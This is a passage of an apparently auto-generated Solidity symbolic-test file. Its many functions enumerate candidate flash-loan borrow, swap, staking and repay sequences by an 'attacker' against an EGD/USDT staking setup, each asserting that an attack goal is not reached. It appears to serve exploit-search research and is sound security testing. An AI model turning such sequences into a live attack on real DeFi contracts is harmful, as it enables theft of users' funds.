        payback_owner_egd(amt2);
        payback_owner_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand061(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_egd(amt2);
        swap_pair_usdt_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand062(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_egd(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand063(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand064(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand065(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand066(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand067(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand068(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_egd(amt2);
        swap_pair_egd_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand069(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand070(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand071(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand072(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand073(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand074(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_egd(amt2);
        swap_pair_usdt_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand075(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand076(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand077(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand078(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_egd(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand079(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_egd(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand080(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_egd(amt2);
        swap_pair_egd_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand081(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand082(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand083(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand084(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_pair_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand085(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand086(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand087(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand088(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_pair_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand089(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand090(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        payback_pair_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand091(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        payback_pair_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand092(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        swap_pair_usdt_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand093(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand094(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand095(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_usdt(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand096(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pair_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_pair_egd(amt2);
        payback_pair_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand097(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pair_egd(amt0);
        borrow_pair_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_pair_egd(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand098(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand099(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand100(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand101(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand102(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand103(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand104(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand105(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand106(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand107(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_usdt_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand108(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_usdt_egd(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand109(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand110(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand111(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_usdt_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand112(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand113(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand114(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_usdt(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand115(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        swap_pair_egd_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand116(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_usdt_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand117(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_usdt(amt1);
        swap_pair_egd_usdt(amt2);
        transaction_egdstaking_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand118(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand119(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        transaction_egdstaking_egd(amt1);
        payback_owner_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand120(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand121(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand122(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_usdt(amt0);
        borrow_owner_egd(amt1);
        transaction_egdstaking_egd(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand123(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        swap_pair_egd_usdt(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand124(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_egd(amt3);
        payback_owner_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand125(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_egd(amt0);
        transaction_egdstaking_egd(amt1);
        swap_pair_egd_usdt(amt2);
        payback_owner_egd(amt3);
        swap_pair_egd_usdt(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand126(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 54);
